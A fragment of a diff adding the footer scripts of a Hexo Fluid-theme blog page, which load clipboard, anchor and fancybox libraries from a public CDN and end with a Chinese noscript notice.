+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
